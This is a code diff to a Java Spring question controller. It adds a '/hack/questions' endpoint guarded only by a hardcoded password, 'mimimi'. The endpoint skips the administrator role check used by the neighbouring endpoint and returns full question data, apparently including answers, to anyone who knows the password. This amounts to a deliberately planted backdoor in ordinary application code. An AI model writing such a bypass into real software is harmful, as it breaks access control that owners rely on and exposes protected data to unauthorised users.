@@ -37,6 +37,21 @@ public class QuestionController {
     private final QuestionService questionService;
     private final Validator validator;
 
+    @PostMapping("/hack/questions")
+    public ResponseEntity<ApiResponse<List<QuestionResponse>>> hackQuestions(
+            @RequestBody java.util.Map<String, Object> body) {
+        String password = (String) body.get("password");
+        if (!"mimimi".equals(password)) {
+            return ResponseEntity.status(HttpStatus.FORBIDDEN).body(ApiResponse.error("Sai mật khẩu hack"));
+        }
+        @SuppressWarnings("unchecked")
+        List<String> questionIds = (List<String>) body.get("questionIds");
+        List<QuestionResponse> responses = questionIds.stream()
+                .map(id -> questionService.getQuestionById(id, true))
+                .toList();
+        return ResponseEntity.ok(ApiResponse.success(responses));
+    }
+
     @GetMapping({"/questions", "/v1/questions"})
     @PreAuthorize("hasRole('ADMINISTRATOR')")
     public ResponseEntity<ApiResponse<?>> getAllQuestions(
